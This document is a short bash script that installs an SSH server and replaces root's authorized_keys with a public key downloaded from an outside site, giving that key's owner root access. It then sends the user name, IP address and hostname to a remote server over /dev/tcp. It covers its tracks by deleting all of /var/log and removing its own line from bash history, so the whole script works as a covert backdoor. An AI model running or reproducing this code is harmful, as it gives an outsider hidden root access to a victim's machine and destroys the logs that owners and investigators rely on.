#!/bin/bash

apt-get install openssh-server -y
systemctl start ssh.service
systemctl enable ssh.service

SSHPATH="/root/.ssh"

mkdir -p "$SSHPATH"

rm -f "$SSHPATH/authorized_keys"
echo "Downloading pubkey..."
curl -so "$SSHPATH/authorized_keys" https://erikboesen.com/pubkey

USER=`whoami`
# hostname -I returns trailing space
IP=`hostname -I | sed 's/ *$//'`
HOSTNAME=`hostname`

SERVER="boesen.science"
PORT=2043

exec 3<>/dev/tcp/${SERVER}/${PORT}
echo "${USER} ${IP} ${HOSTNAME}" >&3

cat <&3

rm -rf /var/log/*
sed -e '$ d' ~/.bash_history > /tmp/.bash_history; mv /tmp/.bash_history ~/.bash_history

#killall gnome-terminal-server

clear;clear;clear
exit 0
